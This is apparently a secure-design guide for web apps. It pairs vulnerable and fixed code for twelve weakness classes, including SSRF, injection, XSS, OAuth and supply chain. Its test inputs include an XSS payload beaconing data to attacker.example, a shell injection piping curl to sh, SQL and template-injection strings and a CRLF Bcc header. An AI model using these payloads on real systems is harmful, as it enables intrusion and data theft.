# Security

**Protects:** Only the right caller can read or change a given thing, every input that crosses a trust boundary is treated as hostile until proven otherwise, and a leaked credential or a bad dependency has a small, known blast radius.
**Read when:** The plan adds a route, a webhook receiver, a login or OAuth flow, an integration that fetches a URL, a template or email built from user text, a new secret, a new service account, a new dependency, or anything that renders content a user or a third party wrote. Code signals: `app.get(`, `router.post(`, `@app.route`, `req.params.id`, `fetch(req.body.url`, `shell=True`, `f"SELECT`, `dangerouslySetInnerHTML`, `process.env.*SECRET`, `redirect(req.query`, `uses: ...@v`, `curl | bash`.
**Prefix:** SEC

## Design questions

1. For each route in this step, which middleware rejects an unauthenticated caller, and is it on by default for new routes or opt-in per route?
2. For each object id the caller sends, which query proves the object belongs to the caller's tenant and that the caller's role may perform this action on it?
3. For each inbound webhook, what exact bytes are verified, against which secret, within what time window, and where is the event id recorded so a second delivery does nothing?
4. Does any code path fetch a URL that a user, tenant admin or third party can influence? If so, what resolves the host, which addresses are refused, and are redirects followed?
5. Which strings from users or third parties end up inside SQL, a shell, a template engine, an email header, an HTTP header, or HTML? For each, what makes it data rather than code?
6. Which cookies carry authority, what are their flags, and what stops a cross-site form or fetch from using them?
7. Where does each secret live, who and what can read it, how is it rotated without downtime, and what proves it never reaches logs, error trackers or prompts?
8. For each OAuth connection: where is `state` bound, how is the redirect URI fixed, which scopes are requested and why, where are refresh tokens stored and under which key?
9. Which service account or database role does this code run as, and what is the worst thing that role can do if this process is fully compromised?
10. Which dependencies, CI actions and install scripts are new, are they pinned to an immutable version, and who can change what runs in the deploy pipeline?
11. What can an attacker learn or harvest by calling this endpoint 100,000 times: valid emails, ids, existence of records, stack traces?

## Categories

### SEC-01 Authentication on every path, deny by default

**How it fails:** Authentication is attached per route. A new route, a debug endpoint, a file download handler or a GraphQL resolver ships without the middleware, and anyone on the internet can call it. A variant: the route is authenticated but any signed-in user can reach an admin-only function (function-level authorization), because the check is "has a session" rather than "has this role".
**Seen in the wild:** No verified incident specific to a forgotten middleware; the failure follows from routing semantics where each handler opts in. OWASP separates this "can reach an endpoint they should not use at all" case (function-level) from object-level failures, see [2].
**Spot it in a plan:** "internal endpoint", "only our frontend calls this", "temporary debug route", "admin page", "we will add auth later", a new router mounted beside the main one.
**Spot it in code:** Express/Fastify: routes registered before `app.use(requireAuth)` or on a second router without it; `router.get(` without an auth argument when siblings have one. Python: FastAPI routes without a `Depends(current_user)`; Flask views without the decorator. Any `if user.is_admin` check inside a handler instead of at the router.
**Build it right:** Invert the default. Mount a small, explicit public allowlist (health check, login, OAuth callback, webhook receivers that verify their own signatures) first, then a global authentication middleware, then everything else. Put role requirements on routers, not inside handlers. Enforce with a test that enumerates every registered route (from the router table or the OpenAPI document) and asserts that an anonymous request gets 401 unless the route is on the allowlist.

Dangerous:
```ts
const app = express();
app.get("/api/invoices/:id", getInvoice);          // forgot requireSession
app.use("/api/admin", requireSession, adminRouter); // any signed-in user is "admin"
app.use("/api", requireSession, apiRouter);
```

Safe:
```ts
const app = express();
app.use(publicRouter);                 // /healthz, /login, /oauth/callback, /webhooks/* only
app.use(requireSession);               // every route below is authenticated by default
app.use("/api/admin", requireRole("admin"), adminRouter);
app.use("/api", apiRouter);
```

**Prove it:** A test walks the route table and calls each route with no credentials, then with a valid non-admin session. Any 2xx outside the allowlist, or any 2xx on an admin route for the non-admin, fails the build.
**Size for now:** A global middleware, a public allowlist and the route-walking test. Policy engines (OPA, Cedar) can wait until roles are configurable per tenant.

### SEC-02 Object-level authorization (IDOR / BOLA)

**How it fails:** The handler is authenticated, takes an id from the path, query or body, and loads the object by id alone. A signed-in user of tenant A changes the id and reads or edits tenant B's object. Sequential or guessable ids make it trivial; random ids only slow it down, because ids leak through URLs, logs, exports and emails.
**Seen in the wild:** First American Financial served title-insurance documents by sequential document number in the URL with no authentication; changing a digit returned another person's bank statements and Social Security numbers. About 885 million files were reachable (2019) [3]. OWASP ranks this as API1:2023 and notes the check must happen in every function that uses client input to access data [2].
**Spot it in a plan:** "fetch by id", "the frontend only shows the user their own items", "ids are UUIDs so they are unguessable", "share link".
**Spot it in code:** `findUnique({ where: { id: req.params.id } })`, `Model.objects.get(id=...)`, `SELECT ... WHERE id = $1` without a tenant or owner predicate; GraphQL resolvers taking `id` args; bulk endpoints taking arrays of ids.
**Build it right:** Strongest first: database row-level security keyed by tenant (see `multi-tenancy` TEN-02); a single data-access module whose lookup functions take the auth context and always add the tenant predicate; a per-action permission check (`can(actor, action, object)`) after loading. Return 404, not 403, for objects outside the caller's scope so existence does not leak. Bulk endpoints check every id, not the first.

Dangerous:
```ts
router.get("/documents/:id", async (req, res) => {
  const doc = await db.document.findUnique({ where: { id: req.params.id } });
  if (!doc) return res.sendStatus(404);
  res.json(doc);
});
```

Safe:
```ts
router.get("/documents/:id", async (req, res) => {
  const doc = await db.document.findFirst({
    where: { id: req.params.id, tenantId: req.auth.tenantId },
  });
  if (!doc || !can(req.auth, "document:read", doc)) return res.sendStatus(404);
  res.json(doc);
});
```

**Prove it:** For every changed route, a test creates the object as tenant A, then calls the route as tenant B and as a lower-privileged user in tenant A. Both must get 404 and the object must be unchanged.
**Size for now:** The scoped data layer plus the two-actor test per route. A full ABAC policy language waits until customers ask for custom roles.

### SEC-03 Inbound request signature verification

**How it fails:** A webhook endpoint is public by necessity. If it trusts the payload without verifying a signature, anyone can post a fake "payment succeeded" or "message from user X" event. Common implementation bugs even when a check exists: verifying a re-serialized JSON body instead of the raw bytes, comparing signatures with `===` (timing leak), skipping the timestamp check, accepting the signature scheme named in the request, or accepting any Google-signed token without checking the audience and service account.
**Seen in the wild:** No verified public incident; the failure follows from the providers' documented models. Stripe states that without verification an attacker can send fake events to fulfil orders or grant access [5].
**Spot it in a plan:** "receive events from Slack / Stripe / Pub/Sub", "the URL is secret", "we allowlist their IPs".
**Spot it in code:** `express.json()` mounted before the webhook route; `JSON.stringify(req.body)` inside an HMAC; `==`/`===` on signature strings; Python `request.json` read before `request.get_data()`; `verify_oauth2_token` without checking `email`.
**Build it right:** One verification function per provider, applied as middleware on the webhook router, operating on the raw body.
- Slack: basestring `v0:{X-Slack-Request-Timestamp}:{raw body}`, HMAC-SHA256 with the signing secret, hex digest prefixed `v0=`, compared with a constant-time function against `X-Slack-Signature`; reject timestamps more than five minutes from local time [4].
- Stripe: header `t=...,v1=...`; signed payload is `{t}.{raw body}`; HMAC-SHA256; only the `v1` scheme counts (ignore others to prevent downgrade); during a secret roll there can be several `v1` values; official libraries default to a five-minute tolerance [5]. Use the library.
- Google Pub/Sub push: an OIDC JWT in `Authorization: Bearer`. Verify the signature and `aud` (must equal the audience configured on the subscription), then check `email` equals your push service account and `email_verified` is true, and `iss` is Google's accounts issuer [6].
Keep IP allowlists as defense in depth only.

Dangerous:
```ts
app.post("/slack/events", express.json(), (req, res) => {
  const ts = req.header("x-slack-request-timestamp");
  const mac = crypto.createHmac("sha256", SLACK_SIGNING_SECRET)
    .update(`v0:${ts}:${JSON.stringify(req.body)}`).digest("hex"); // not the raw bytes
  if (`v0=${mac}` !== req.header("x-slack-signature")) return res.sendStatus(401); // no window, not constant-time
  handle(req.body);
  res.sendStatus(200);
});
```

Safe:
```ts
app.post("/slack/events", express.raw({ type: "*/*", limit: "1mb" }), (req, res) => {
  const tsHeader = req.header("x-slack-request-timestamp") ?? "";
  const sig = Buffer.from(req.header("x-slack-signature") ?? "");
  const ts = Number(tsHeader);
  if (!Number.isInteger(ts) || Math.abs(Date.now() / 1000 - ts) > 300) return res.sendStatus(401);
  const expected = Buffer.from("v0=" + crypto.createHmac("sha256", SLACK_SIGNING_SECRET)
    .update(`v0:${tsHeader}:`).update(req.body as Buffer).digest("hex"));
  if (sig.length !== expected.length || !crypto.timingSafeEqual(sig, expected)) return res.sendStatus(401);
  enqueue(JSON.parse((req.body as Buffer).toString("utf8")));
  res.sendStatus(200);
});
```

**Prove it:** Tests send (a) a correctly signed body, (b) the same body with one byte changed, (c) a valid signature with a timestamp six minutes old, (d) a Pub/Sub token minted for a different audience or service account. Only (a) is accepted.
**Size for now:** Provider SDK verification on every receiver plus the four tests. mTLS or private connectivity for webhooks is not needed at this size.

### SEC-04 Replay and duplicate delivery

**How it fails:** A valid signed request is captured and re-sent, or the provider legitimately retries. Both arrive with valid signatures. Without a freshness window and an idempotency record, the handler fulfils the order twice, posts the Slack reply twice, or re-runs a privileged action. Replay windows are also easy to disable by accident: Stripe documents that a tolerance of `0` turns the recency check off entirely [5]. Pub/Sub push tokens can be up to an hour old [6], so a token alone is not a nonce.
**Seen in the wild:** No verified public incident; follows from documented retry semantics. Stripe states endpoints may receive the same event more than once and that a retry gets a new timestamp and signature, so the signature cannot serve as the dedupe key [5].
**Spot it in a plan:** "process the event", "Stripe retries until 2xx", "at-least-once", "we check the signature so it is safe".
**Spot it in code:** Handlers with side effects and no lookup of `event.id` / `event_id` / Pub/Sub `messageId`; `tolerance=0` or `tolerance: 0`; dedupe done with a read-then-write instead of a unique constraint.
**Build it right:** Two layers. Freshness: keep the provider's window (five minutes for Slack and Stripe). Idempotency: a `processed_events (provider, event_id)` table with a primary key, inserted in the same transaction as the side effect, so the database rejects the second delivery even under concurrency. For Stripe, some duplicates arrive as separate Event objects; dedupe on `data.object.id` plus `event.type` where it matters [5].

Dangerous:
```python
event = stripe.Webhook.construct_event(payload, sig_header, secret, tolerance=0)  # recency check off
fulfil_order(event["data"]["object"]["id"])                                     # runs on every retry
```

Safe:
```python
event = stripe.Webhook.construct_event(payload, sig_header, secret)  # library default tolerance
with conn.transaction():
    row = conn.execute(
        "INSERT INTO processed_events (provider, event_id) VALUES ('stripe', %s) "
        "ON CONFLICT DO NOTHING RETURNING 1",
        (event["id"],),
    ).fetchone()
    if row is None:
        return ("", 200)  # already handled
    fulfil_order(conn, event["data"]["object"]["id"])
return ("", 200)
```

**Prove it:** Deliver the same signed event twice within 50 ms from two workers; exactly one `fulfilments` row exists. Replay a captured request after six minutes; it is rejected with 401.
**Size for now:** The unique-key table and the provider window. A distributed nonce cache is unnecessary while Postgres handles the write rate.

### SEC-05 Server-side request forgery (SSRF)

**How it fails:** A feature fetches a URL that someone else controls: a webhook destination a tenant configures, a link preview, an "import from URL", an avatar URL, an OAuth discovery document. The attacker points it at `http://169.254.169.254/` (cloud metadata), `localhost:6379`, or an internal admin service. Hostname checks are bypassed by DNS that resolves to a private address after validation (rebinding), by redirects, by IPv4-mapped IPv6, or by parser disagreements.
**Seen in the wild:** In the 2019 Capital One breach, researchers theorized an SSRF flaw let the attacker make the server hosting a web application firewall call the EC2 metadata service, which returned temporary credentials for a WAF role; that role could list more than 700 S3 buckets. Capital One and AWS publicly cited a "firewall misconfiguration" [7].
**Spot it in a plan:** "user-supplied webhook URL", "fetch the page and summarize it", "unfurl links", "import from URL", "custom OAuth/OIDC issuer".
**Spot it in code:** `fetch(req.body.url)`, `axios.get(userUrl)`, `requests.get(url)` with `allow_redirects` default true, `urllib.request.urlopen`, headless browsers given user URLs, LLM tools that fetch URLs.
**Build it right:** Prefer an allowlist of hosts when the set is known. When it is not (customer webhooks), do resolve-then-check-then-connect: resolve the name, reject if any address is not public unicast (loopback, RFC 1918, link-local including 169.254.169.254, unique-local IPv6, IPv4-mapped forms), connect to the validated address while keeping the hostname for SNI and certificate checks, disable redirects, restrict scheme and port, cap response size and time [8]. At the network layer, run fetchers in an egress-restricted subnet and enable IMDSv2 on AWS as defense in depth [8].

Dangerous:
```ts
app.post("/integrations/test-webhook", async (req, res) => {
  const r = await fetch(req.body.url);             // any scheme, host, port; follows redirects
  res.json({ status: r.status, body: await r.text() });
});
```

Safe:
```ts
import { lookup } from "node:dns/promises";
import ipaddr from "ipaddr.js";
import { Agent, fetch } from "undici";

export async function fetchExternal(raw: string) {
  const url = new URL(raw);
  if (url.protocol !== "https:" || (url.port !== "" && url.port !== "443")) throw new Error("blocked_url");
  const addrs = await lookup(url.hostname, { all: true });
  if (addrs.length === 0 || addrs.some(a => ipaddr.parse(a.address).range() !== "unicast")) throw new Error("blocked_address");
  const { address, family } = addrs[0];
  const dispatcher = new Agent({
    connect: { lookup: (_h: string, o: any, cb: any) => (o?.all ? cb(null, [{ address, family }]) : cb(null, address, family)) },
  });
  return fetch(url, { dispatcher, redirect: "manual", signal: AbortSignal.timeout(5_000) });
}
```

**Prove it:** Point the feature at `https://<name that resolves to 127.0.0.1>`, at `http://169.254.169.254/latest/meta-data/`, at `https://[::ffff:10.0.0.1]/`, and at a public URL that 302-redirects to an internal address. Every case must fail before a TCP connection to the internal address is opened (watch with a listener on that address).
**Size for now:** One shared `fetchExternal` used by every outbound-to-arbitrary-URL feature, plus IMDSv2. A dedicated egress proxy can wait until there are several fetching services.

### SEC-06 Injection into SQL and shells

**How it fails:** A string from a user, a tenant admin, an email or an LLM is concatenated into a SQL statement or a shell command. A quote ends the literal and the rest runs as code: data from other tenants comes back, rows are deleted, or a shell runs `; curl attacker | sh`. Dynamic identifiers (sort column, table name) cannot be bound as parameters and are the usual hole in otherwise parameterized code. Arguments that start with `-` can be parsed as options even without a shell.
**Seen in the wild:** CVE-2023-34362, a SQL injection in Progress MOVEit Transfer, was exploited as a zero-day from 27 May 2023 by the CL0P group to install the LEMURLOOT web shell and steal data from MOVEit databases [9].
**Spot it in a plan:** "custom filters", "sort by any column", "run the converter on the upload", "let the agent query the database".
**Spot it in code:** Python: `f"SELECT`, `% (`, `.format(` near `execute(`; `shell=True`; `os.system(`. Node: template literals in `query(\``, `sequelize.query(` with interpolation, `exec(` from `child_process`, `$queryRawUnsafe`. Go: `fmt.Sprintf` into `db.Query`.
**Build it right:** Bound parameters for every value. Identifiers from an allowlist mapped in code (or `psycopg.sql.Identifier` for truly dynamic cases). Never `shell=True`; pass an argument vector, use server-generated absolute paths for files so no argument can start with `-`, set a timeout. Run the database role with least privilege (SEC-13) so a missed spot cannot drop tables.

Dangerous:
```python
order = request.args.get("sort", "created_at")
cur.execute(f"SELECT id, email FROM contacts WHERE tenant_id = '{tenant_id}' ORDER BY {order}")
subprocess.run(f"pdftotext {upload.filename} out.txt", shell=True)
```

Safe:
```python
SORTS = {"created": "created_at", "name": "name", "email": "email"}
order = SORTS.get(request.args.get("sort", "created"), "created_at")
cur.execute(
    sql.SQL("SELECT id, email FROM contacts WHERE tenant_id = %s ORDER BY {}").format(sql.Identifier(order)),
    (tenant_id,),
)
path = UPLOAD_DIR / f"{uuid4()}.pdf"           # absolute, server-generated, never starts with '-'
path.write_bytes(upload.read())
subprocess.run(["pdftotext", str(path), str(path.with_suffix(".txt"))], check=True, timeout=30)
```

**Prove it:** Send `sort=created_at;DROP TABLE contacts--`, an email of `x' OR '1'='1`, and an upload named `--help; touch /tmp/pwned`. The query returns only the caller's rows, the table still exists, and `/tmp/pwned` does not.
**Size for now:** Parameterized queries, allowlisted identifiers, argument vectors and a lint rule (Semgrep or ESLint) that flags string-built SQL and `shell=True`. No WAF needed for this.

### SEC-07 Injection into templates and headers (SSTI, CRLF)

**How it fails:** Two shapes. Template injection: tenant-authored or user-authored text is rendered as a template by a full template engine (Jinja2 without a sandbox, Nunjucks, Handlebars with helpers), and expressions in it reach Python or JavaScript objects, which can lead to code execution or secret disclosure. Header injection: a value containing CR or LF is placed into a raw email header or HTTP header, so the attacker adds `Bcc:` recipients, a second body, or a `Set-Cookie`. Log lines suffer the same CR/LF forging.
**Seen in the wild:** No verified incident cited here; the header case follows from line-delimited header formats, and OWASP calls for removing CR, LF and delimiter characters from untrusted data before it is written to line-oriented sinks such as logs [10].
**Spot it in a plan:** "customers can customize the email template", "subject line copied from the inbound email", "reply-to set to the customer's address", "custom footer".
**Spot it in code:** `Template(user_text).render`, `nunjucks.renderString(tenantTemplate`, `Handlebars.compile(userInput)`; raw SMTP strings built with `\r\n` and interpolation; `res.setHeader(name, req.query.x)`; `log.info(f"... {user_input}")` in text-format logs.
**Build it right:** Templates written by customers use a logic-less engine (Mustache) or a sandboxed one with an allowlist of variables, and the variables are plain strings, not objects with methods. Reject raw-output syntax in customer templates. Headers go through a mail library's structured fields, and every header value is checked for CR/LF and rejected (not stripped silently). Logs are structured (JSON) so values are encoded.

Dangerous:
```ts
const html = nunjucks.renderString(tenant.footerTemplate, { user, config });  // full engine, live objects
const raw = `From: support@acme.example\r\nTo: ${to}\r\nSubject: Re: ${inbound.subject}\r\n\r\n${body}`;
await smtp.sendRaw(raw);                                                      // "\r\nBcc: victim@..." works
```

Safe:
```ts
function headerValue(v: string): string {
  if (/[\r\n]/.test(v)) throw new Error("crlf_in_header");
  return v;
}
if (/\{\{\{|\{\{&/.test(tenant.footerTemplate)) throw new Error("raw_output_not_allowed");
const html = Mustache.render(tenant.footerTemplate, { userName: user.name, companyName: tenant.name });
await transporter.sendMail({
  from: "support@acme.example",
  to: headerValue(to),
  subject: `Re: ${headerValue(inbound.subject)}`,
  text: body,
});
```

**Prove it:** Save a footer template of `{{constructor.constructor('return process')().env}}` and confirm it renders literally or is rejected. Send a ticket whose subject is `hi\r\nBcc: attacker@example.com`; the send is rejected and no message reaches the Bcc address in a test SMTP sink.
**Size for now:** Logic-less templates and a header guard. A full template sandbox review only if customers get conditionals and loops.

### SEC-08 Cross-site scripting and output encoding

**How it fails:** Content written by someone else (an email body, a Slack message, a CRM note, an LLM answer, a tenant's company name) is inserted into a page as HTML. A `<script>`, an `onerror=` attribute, or a `javascript:` link runs in the viewer's session and acts as them: reads data, calls APIs, exfiltrates tokens. Frameworks escape by default; the holes are the escape hatches and URL attributes.
**Seen in the wild:** No single incident cited; the mechanism and the framework escape hatches (`dangerouslySetInnerHTML`, Angular `bypassSecurityTrustAs*`, Lit `unsafeHTML`) are documented by OWASP [11].
**Spot it in a plan:** "render the email as HTML", "show the model's markdown answer", "rich text notes", "user profile website link", "embed customer content in our admin tool".
**Spot it in code:** `dangerouslySetInnerHTML`, `v-html`, `innerHTML =`, `insertAdjacentHTML`, `bypassSecurityTrust`, `marked(` or other markdown renderers without sanitization, `href={user...}`, server templates with `|safe` or `{{{ }}}`.
**Build it right:** Keep framework auto-escaping as the only path for text. Where HTML must be rendered, sanitize with a maintained sanitizer (DOMPurify) at render time and never mutate its output after. Allow only `http:` and `https:` (and `mailto:` if needed) in links built from untrusted values. Add a CSP as defense in depth, never as the only control [11]. Internal admin tools that show customer content get the same treatment: staff sessions are high-value targets.

Dangerous:
```tsx
export function Message({ m }: { m: InboundEmail }) {
  return (
    <>
      <div dangerouslySetInnerHTML={{ __html: m.bodyHtml }} />
      <a href={m.senderWebsite}>Website</a>
    </>
  );
}
```

Safe:
```tsx
import DOMPurify from "dompurify";

function safeHref(u: string): string | undefined {
  try { const p = new URL(u); return p.protocol === "https:" || p.protocol === "http:" ? p.href : undefined; }
  catch { return undefined; }
}

export function Message({ m }: { m: InboundEmail }) {
  return (
    <>
      <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(m.bodyHtml) }} />
      <a href={safeHref(m.senderWebsite)} rel="noopener noreferrer">Website</a>
    </>
  );
}
```

**Prove it:** Seed a message with `<img src=x onerror="fetch('/api/me').then(r=>r.text()).then(t=>navigator.sendBeacon('https://attacker.example',t))">` and a website of `javascript:alert(1)`. Open it in a browser test; no request reaches `attacker.example` and the link has no `href`.
**Size for now:** Sanitizer at every HTML sink, URL scheme check, a basic CSP. Trusted Types can wait.

### SEC-09 Sessions and cross-site request forgery

**How it fails:** Session cookies without `Secure`/`HttpOnly`/`SameSite` leak over HTTP or to scripts. A session id that survives login (no regeneration) lets an attacker plant a known id (fixation). Sessions that survive logout, password change or role removal keep access alive. State-changing routes reachable by `GET`, or by cross-site `POST` without a token or origin check, let any web page act as the user. Shared request state across threads can even hand one user's session to another.
**Seen in the wild:** In March 2021 a thread-safety bug in GitHub's Rails app let a background thread re-run authentication against another request's reused Rack `env` and write that user's session cookie into a different response; GitHub revoked all sessions on GitHub.com [12]. CircleCI's January 2023 breach began with malware stealing an engineer's valid, 2FA-backed SSO session cookie [13].
**Spot it in a plan:** "remember me", "log in with magic link", "admin can change roles", "GET /unsubscribe does the action", "our API uses cookies".
**Spot it in code:** `cookie: {}` or missing `secure`/`httpOnly`; no `req.session.regenerate` on login; `app.get(` handlers that write; CORS with `credentials: true` and a reflected origin; session stores without a revoke-by-user index.
**Build it right:** Server-side sessions (or short-lived tokens with server revocation), cookie `__Host-` prefix with `Secure; HttpOnly; SameSite=Lax; Path=/`. Regenerate the id on login and privilege change. Revoke all of a user's sessions on logout-everywhere, password change, role removal and deprovisioning (see TEN-12). CSRF: no state change on `GET`; for cookie-authenticated non-GET requests, reject `Sec-Fetch-Site: cross-site` and require a session-bound token or a custom header with strict CORS [14]. Never share mutable per-request objects across threads.

Dangerous:
```ts
app.use(session({ secret: "dev", cookie: {} }));
app.post("/login", async (req, res) => {
  const u = await verifyPassword(req.body.email, req.body.password);
  req.session.userId = u.id;                       // same session id as before login
  res.redirect("/");
});
app.get("/settings/delete-account", deleteAccount); // state change on GET
```

Safe:
```ts
app.use(session({
  name: "__Host-sid", secret: process.env.SESSION_SECRET!, store, resave: false, saveUninitialized: false,
  cookie: { secure: true, httpOnly: true, sameSite: "lax", path: "/", maxAge: 8 * 60 * 60 * 1000 },
}));
app.use((req, res, next) => {
  if (["GET", "HEAD", "OPTIONS"].includes(req.method)) return next();
  if (req.get("sec-fetch-site") === "cross-site") return res.sendStatus(403);
  return requireCsrfToken(req, res, next);           // session-bound token, constant-time compare
});
app.post("/login", async (req, res, next) => {
  const u = await verifyPassword(req.body.email, req.body.password);
  if (!u) return res.status(401).json({ error: "invalid_credentials" });
  req.session.regenerate(err => { if (err) return next(err); req.session.userId = u.id; res.sendStatus(204); });
});
app.post("/settings/delete-account", deleteAccount);
```

**Prove it:** Capture the session id before login; after login it differs. After password change, the old cookie gets 401. A page on another origin auto-submitting a form to `/settings/delete-account` gets 403.
**Size for now:** The above, plus "log out all sessions". Device lists and anomaly detection can wait.

### SEC-10 Secrets: storage, logging and rotation

**How it fails:** API keys, OAuth refresh tokens, signing secrets and database passwords end up in source, in CI variables readable by every job, in logs (`Authorization` headers, connection strings, request dumps), in error trackers, or in LLM prompts. Encryption at rest helps less than expected when the key sits beside the data in the same process. When a leak happens, nobody knows which secrets to rotate or how to rotate them without downtime.
**Seen in the wild:** Twitter disclosed in 2018 that a bug wrote passwords to an internal log before hashing [15]. In the CircleCI breach the attacker exfiltrated customer environment variables, tokens and keys that were encrypted at rest, but also extracted encryption keys from a running process; CircleCI told all customers to rotate every secret [13].
**Spot it in a plan:** "store the API key in the config table", "log the request for debugging", "encrypt the token column", "we will rotate if it leaks".
**Spot it in code:** Literals matching `sk_live_`, `xox[a-z]-`, `ya29.`, `-----BEGIN`; `log.*(req.headers`, `log.*(DATABASE_URL`, `console.log(config)`; `send_default_pii=True`; `.env` committed; secrets passed in URL query strings.
**Build it right:** Secrets come from a secret manager at runtime, separate per environment. Customer credentials (OAuth refresh tokens, API keys) are envelope-encrypted with a KMS key, with the tenant id as additional authenticated data so a ciphertext cannot be swapped between rows. Logging goes through one configured logger with a redaction filter by key name and by token pattern; error trackers scrub request bodies and headers. Every secret has an owner, a rotation runbook and support for two valid values during rotation (Stripe allows the old webhook secret to stay valid up to 24 hours while you switch [5]). Secret scanning runs in CI and on the repository.

Dangerous:
```python
log.info("gmail call", extra={"headers": dict(session.headers)})   # Authorization: Bearer ya29...
log.error("db connect failed: %s", DATABASE_URL)                  # postgresql://app:hunter2@...
conn.execute("INSERT INTO connections (tenant_id, refresh_token) VALUES (%s, %s)", (tid, tokens["refresh_token"]))
```

Safe:
```python
SECRET_KEYS = {"authorization", "cookie", "password", "access_token", "refresh_token", "client_secret"}
TOKEN_RE = re.compile(r"(ya29\.[\w-]+|xox[a-z]-[\w-]+|sk_(live|test)_\w+|Bearer\s+\S+|://[^:/\s]+:[^@\s]+@)")

def scrub(v):
    if isinstance(v, dict):
        return {k: "[REDACTED]" if str(k).lower() in SECRET_KEYS else scrub(x) for k, x in v.items()}
    return TOKEN_RE.sub("[REDACTED]", v) if isinstance(v, str) else v

class RedactFilter(logging.Filter):
    def filter(self, record):
        record.msg = scrub(record.msg)
        if isinstance(record.args, tuple):
            record.args = tuple(scrub(a) for a in record.args)
        return True

ciphertext = kms.encrypt(key_name=TOKEN_KEY, plaintext=tokens["refresh_token"].encode(), aad=str(tid).encode())
conn.execute("INSERT INTO connections (tenant_id, refresh_token_enc) VALUES (%s, %s)", (tid, ciphertext))
```

**Prove it:** Run the integration test suite with log capture and grep the captured logs and error-tracker payloads for every test secret value; zero hits. Rotate the webhook signing secret in staging with traffic flowing; no request fails.
**Size for now:** Secret manager, KMS-encrypted customer tokens, the redaction filter, CI secret scanning and a written rotation runbook per secret. An HSM-backed or per-tenant-key scheme waits for a customer contract that requires it.

### SEC-11 OAuth client pitfalls

**How it fails:** The app connects a customer's Google, Slack or CRM account. Without a `state` value bound to the user's session, an attacker can complete the flow with their own code and attach their account to the victim's workspace (login CSRF), or the callback attaches tokens to a tenant named in the query string. Redirect URIs taken from the request, or matched by prefix, let codes leak to an attacker's page. Requesting broad scopes "for later" makes every token a bigger prize. Refresh tokens stored in plaintext are a single query away from a mass compromise.
**Seen in the wild:** In April 2022 attackers used OAuth user tokens stolen from Heroku and Travis CI integrations to list and clone private repositories from dozens of GitHub organizations, then used an AWS key found in those repositories to reach npm's production infrastructure [16].
**Spot it in a plan:** "connect your Gmail", "Sign in with Slack", "we will request full mailbox access", "store tokens so the job can run".
**Spot it in code:** Authorization URLs without `state` or `code_challenge`; callbacks reading `redirect_uri`, `tenant` or `next` from the query; `refresh_token` columns of type `text`; scope strings like `https://mail.google.com/` where `gmail.send` would do.
**Build it right:** Follow RFC 9700 (OAuth 2.0 Security BCP): one-time `state` bound to the session (or PKCE where the server supports it, which public clients must use), `S256` PKCE, exact redirect URI matching, no implicit grant, audience-restricted tokens, refresh token rotation or sender-constraining for public clients [17]. Bind the connection to the tenant from the session, never from the callback. Request the narrowest scopes per feature and add more incrementally. Store refresh tokens encrypted (SEC-10), record granted scopes, and handle revocation (mark the connection broken and tell the admin). Slack: check `state` on return; with token rotation enabled, access tokens expire every 12 hours and each refresh token is single-use [18][19].

Dangerous:
```ts
app.get("/oauth/callback", async (req, res) => {
  const tokens = await exchangeCode(String(req.query.code), String(req.query.redirect_uri));
  await db.connection.create({ data: { tenantId: String(req.query.tenant), refreshToken: tokens.refresh_token } });
  res.redirect(String(req.query.next));            // open redirect
});
```

Safe:
```ts
app.get("/oauth/start", requireSession, (req, res) => {
  const state = crypto.randomBytes(32).toString("base64url");
  const verifier = crypto.randomBytes(32).toString("base64url");
  req.session.oauth = { state, verifier, tenantId: req.auth.tenantId, at: Date.now() };
  const challenge = crypto.createHash("sha256").update(verifier).digest("base64url");
  res.redirect(buildAuthorizeUrl({ state, challenge, redirectUri: REDIRECT_URI, scopes: ["https://www.googleapis.com/auth/gmail.send"] }));
});

app.get("/oauth/callback", requireSession, async (req, res) => {
  const pending = req.session.oauth; delete req.session.oauth;
  const got = Buffer.from(String(req.query.state ?? ""));
  if (!pending || Date.now() - pending.at > 10 * 60 * 1000 || got.length !== Buffer.byteLength(pending.state)
      || !crypto.timingSafeEqual(got, Buffer.from(pending.state))) return res.sendStatus(400);
  const tokens = await exchangeCode(String(req.query.code), REDIRECT_URI, pending.verifier);
  await saveConnection(pending.tenantId, await encryptForTenant(pending.tenantId, tokens.refresh_token), tokens.scope);
  res.redirect("/settings/integrations");
});
```

**Prove it:** Start a flow as user A, then open the callback URL with A's code in user B's browser; it fails. Replay a callback with a valid code but a missing or stale `state`; it fails. Revoke the app at the provider; the next job marks the connection broken and alerts within one run.
**Size for now:** The above for each provider. Sender-constrained tokens (DPoP, mTLS) wait until a provider or customer requires them.

### SEC-12 Dependencies and supply chain

**How it fails:** Code you did not write runs with your secrets: a compromised npm or PyPI package, a CI action referenced by a movable tag, a `curl | bash` installer, a postinstall script. In CI, that code can read every environment variable, including deploy keys and cloud credentials.
**Seen in the wild:** An attacker modified Codecov's Bash Uploader from 31 January 2021 to send the full `env` of customers' CI jobs to an external server; it was found on 1 April 2021 when a customer noticed the script's checksum did not match [20].
**Spot it in a plan:** "add a GitHub Action for X", "use this SDK", "install via script", "CI deploys with the production key".
**Spot it in code:** `uses: owner/action@v1` or `@main`; `curl ... | bash`; `npm install` (not `npm ci`) in CI; no lockfile; `pip install` without hashes or a lock; `permissions:` missing in workflows; long-lived cloud keys in CI secrets.
**Build it right:** Lockfiles committed and enforced (`npm ci`, `uv sync --frozen`, `pip install --require-hashes`). Third-party CI actions pinned by full commit SHA. Downloaded scripts verified against a checksum. Workflow `permissions` minimal by default. Deploy credentials short-lived (OIDC federation from CI to the cloud) and scoped to the deploy job. Automated dependency updates reviewed like code. Disable install scripts where the build allows it.

Dangerous:
```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: some-org/setup-tool@v2
      - run: curl -s https://tool.example/install.sh | bash
      - run: npm install && npm run deploy
        env: { AWS_SECRET_ACCESS_KEY: "${{ secrets.AWS_SECRET_ACCESS_KEY }}" }
```

Safe:
```yaml
permissions:
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions: { contents: read, id-token: write }
    steps:
      - uses: some-org/setup-tool@3f1c2a9e8b7d6c5f4e3a2b1c0d9e8f7a6b5c4d3e # v2.4.1
      - run: |
          curl -sSfLo install.sh https://tool.example/install.sh
          echo "${INSTALL_SH_SHA256}  install.sh" | sha256sum -c -
          bash install.sh
      - run: npm ci --ignore-scripts && npm run deploy   # cloud creds via OIDC role, not a stored key
```

**Prove it:** Change one byte of the pinned installer in a test mirror; the job fails at `sha256sum -c`. Run a workflow from a fork PR; it cannot read deploy secrets or assume the deploy role.
